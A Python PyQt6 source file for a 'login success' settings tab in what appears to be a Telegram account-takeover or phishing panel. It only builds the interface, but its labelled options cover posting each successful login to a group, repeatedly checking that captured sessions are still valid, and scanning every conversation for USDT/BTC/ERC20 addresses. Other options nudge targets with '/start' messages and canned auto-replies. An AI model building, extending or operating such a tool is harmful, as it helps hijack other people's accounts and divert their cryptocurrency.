"""登录成功 Tab — Post-login configuration."""

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QFormLayout, QGroupBox, QHBoxLayout,
    QLineEdit, QTextEdit, QCheckBox, QSpinBox, QPushButton,
    QLabel, QFileDialog, QScrollArea,
)
from PyQt6.QtCore import Qt


class SuccessConfigTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        outer = QVBoxLayout(self)
        outer.setContentsMargins(0, 0, 0, 0)
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        content = QWidget()
        layout = QVBoxLayout(content)
        layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        # ── 登录成功提示 ──
        grp1 = QGroupBox("登录成功提示")
        form1 = QFormLayout()

        self.success_text = QTextEdit()
        self.success_text.setMaximumHeight(80)
        form1.addRow("登录成功后提示:", self.success_text)

        self.session_valid_text = QTextEdit()
        self.session_valid_text.setMaximumHeight(80)
        form1.addRow("保持登录期间 session 仍有效提示:", self.session_valid_text)

        self.session_invalid_text = QTextEdit()
        self.session_invalid_text.setMaximumHeight(80)
        form1.addRow("保持登录期间 session 失败提示:", self.session_invalid_text)

        grp1.setLayout(form1)
        layout.addWidget(grp1)

        # ── 登录成功后操作 ──
        grp2 = QGroupBox("登录成功后操作")
        form2 = QFormLayout()

        # Send photo
        photo_row = QHBoxLayout()
        self.success_send_photo = QCheckBox("登录成功后发送图片 (图上+文案下)")
        photo_row.addWidget(self.success_send_photo)
        self.success_photo_path = QLineEdit()
        self.success_photo_path.setPlaceholderText("图片路径")
        photo_row.addWidget(self.success_photo_path)
        photo_btn = QPushButton("选择")
        photo_btn.setFixedWidth(50)
        photo_btn.clicked.connect(self._browse_photo)
        photo_row.addWidget(photo_btn)
        form2.addRow(photo_row)

        # Group upload
        self.success_group_id = QLineEdit()
        self.success_group_id.setPlaceholderText("群组/频道 ID（负数），如 -1003866884498")
        form2.addRow("登录成功上传到群:", self.success_group_id)

        self.group_password = QLineEdit()
        self.group_password.setPlaceholderText("群绑定密码")
        form2.addRow("群绑定密码:", self.group_password)

        # Post-login session check
        self.session_check_enabled = QCheckBox("启用 session 有效性检测（开启后按延迟秒数循环检测，直到失效）")
        form2.addRow(self.session_check_enabled)

        check_row = QHBoxLayout()
        check_row.addWidget(QLabel("检测间隔秒数:"))
        self.post_login_delay = QSpinBox()
        self.post_login_delay.setRange(1, 3600)
        self.post_login_delay.setValue(300)
        check_row.addWidget(self.post_login_delay)
        check_row.addWidget(QLabel("（首次登录立即检测，之后每隔此秒数循环检测）"))
        check_row.addStretch()
        form2.addRow(check_row)

        # Consecutive failure threshold
        fail_row = QHBoxLayout()
        fail_row.addWidget(QLabel("连续失败次数阈值:"))
        self.session_check_fail_threshold = QSpinBox()
        self.session_check_fail_threshold.setRange(1, 10)
        self.session_check_fail_threshold.setValue(3)
        fail_row.addWidget(self.session_check_fail_threshold)
        fail_row.addWidget(QLabel("（连续失败达到此次数才报告失效，防止临时网络问题误报）"))
        fail_row.addStretch()
        form2.addRow(fail_row)

        # Session invalid notify group
        self.session_invalid_notify_group = QCheckBox("session 失效时发送通知到群")
        form2.addRow(self.session_invalid_notify_group)

        # USDT
        self.usdt_enabled = QCheckBox("登录成功后自动提取 USDT/BTC/ERC20 地址  每对话扫描消息")
        form2.addRow(self.usdt_enabled)

        # /start 催促
        remind_row = QHBoxLayout()
        remind_row.addWidget(QLabel("/start催促:"))
        remind_row.addWidget(QLabel("等待秒数:"))
        self.start_remind_wait = QSpinBox()
        self.start_remind_wait.setRange(0, 600)
        self.start_remind_wait.setValue(45)
        remind_row.addWidget(self.start_remind_wait)
        remind_row.addWidget(QLabel("发送次数:"))
        self.start_remind_count = QSpinBox()
        self.start_remind_count.setRange(0, 10)
        self.start_remind_count.setValue(1)
        remind_row.addWidget(self.start_remind_count)
        remind_row.addWidget(QLabel("（0=不发；每次间隔此秒数）"))
        remind_row.addStretch()
        form2.addRow(remind_row)

        grp2.setLayout(form2)
        layout.addWidget(grp2)

        # ── 自动回复 ──
        grp3 = QGroupBox("自动回复")
        form3 = QFormLayout()

        interval_row = QHBoxLayout()
        interval_row.addWidget(QLabel("间隔分钟:"))
        self.auto_reply_interval = QSpinBox()
        self.auto_reply_interval.setRange(1, 60)
        self.auto_reply_interval.setValue(1)
        interval_row.addWidget(self.auto_reply_interval)
        interval_row.addWidget(QLabel("回复次数:"))
        self.auto_reply_max = QSpinBox()
        self.auto_reply_max.setRange(0, 10)
        self.auto_reply_max.setValue(3)
        interval_row.addWidget(self.auto_reply_max)
        interval_row.addStretch()
        form3.addRow(interval_row)

        self.auto_reply_1 = QTextEdit()
        self.auto_reply_1.setMaximumHeight(80)
        form3.addRow("自动回复1:", self.auto_reply_1)

        self.auto_reply_2 = QTextEdit()
        self.auto_reply_2.setMaximumHeight(80)
        form3.addRow("自动回复2:", self.auto_reply_2)

        self.auto_reply_3 = QTextEdit()
        self.auto_reply_3.setMaximumHeight(80)
        form3.addRow("自动回复3:", self.auto_reply_3)

        grp3.setLayout(form3)
        layout.addWidget(grp3)

        # Save
        save_row = QHBoxLayout()
        save_row.addStretch()
        self.save_btn = QPushButton("保存配置")
        self.save_btn.setObjectName("saveBtn")
        save_row.addWidget(self.save_btn)
        layout.addLayout(save_row)

        layout.addStretch()
        scroll.setWidget(content)
        outer.addWidget(scroll)

    def _browse_photo(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "选择图片", "", "Images (*.png *.jpg *.jpeg *.gif)")
        if path:
            self.success_photo_path.setText(path)

    def load_config(self, cfg):
        self.success_text.setPlainText(cfg.get("success_text", ""))
        self.session_valid_text.setPlainText(cfg.get("session_valid_text", ""))
        self.session_invalid_text.setPlainText(cfg.get("session_invalid_text", ""))
        self.success_send_photo.setChecked(cfg.get("success_send_photo", False))
        self.success_photo_path.setText(cfg.get("success_photo_path", ""))
        self.success_group_id.setText(cfg.get("success_group_id", ""))
        self.group_password.setText(cfg.get("group_password", ""))
        self.session_check_enabled.setChecked(cfg.get("session_check_enabled", False))
        self.post_login_delay.setValue(cfg.get("post_login_check_delay", 300))
        self.session_check_fail_threshold.setValue(cfg.get("session_check_fail_threshold", 3))
        self.session_invalid_notify_group.setChecked(cfg.get("session_invalid_notify_group", False))
        self.usdt_enabled.setChecked(cfg.get("usdt_extract_enabled", False))
        self.start_remind_wait.setValue(cfg.get("start_remind_wait", 45))
        self.start_remind_count.setValue(cfg.get("start_remind_count", 1))
        self.auto_reply_interval.setValue(cfg.get("auto_reply_interval", 1))
        self.auto_reply_max.setValue(cfg.get("auto_reply_max", 3))
        self.auto_reply_1.setPlainText(cfg.get("auto_reply_1", ""))
        self.auto_reply_2.setPlainText(cfg.get("auto_reply_2", ""))
        self.auto_reply_3.setPlainText(cfg.get("auto_reply_3", ""))

    def save_config(self, cfg):
        cfg.update({
            "success_text": self.success_text.toPlainText(),
            "session_valid_text": self.session_valid_text.toPlainText(),
            "session_invalid_text": self.session_invalid_text.toPlainText(),
            "success_send_photo": self.success_send_photo.isChecked(),
            "success_photo_path": self.success_photo_path.text().strip(),
            "success_group_id": self.success_group_id.text().strip(),
            "group_password": self.group_password.text().strip(),
            "session_check_enabled": self.session_check_enabled.isChecked(),
            "post_login_check_delay": self.post_login_delay.value(),
            "session_check_fail_threshold": self.session_check_fail_threshold.value(),
            "session_invalid_notify_group": self.session_invalid_notify_group.isChecked(),
            "usdt_extract_enabled": self.usdt_enabled.isChecked(),
            "start_remind_wait": self.start_remind_wait.value(),
            "start_remind_count": self.start_remind_count.value(),
            "auto_reply_interval": self.auto_reply_interval.value(),
            "auto_reply_max": self.auto_reply_max.value(),
            "auto_reply_1": self.auto_reply_1.toPlainText(),
            "auto_reply_2": self.auto_reply_2.toPlainText(),
            "auto_reply_3": self.auto_reply_3.toPlainText(),
        })
        cfg.save()
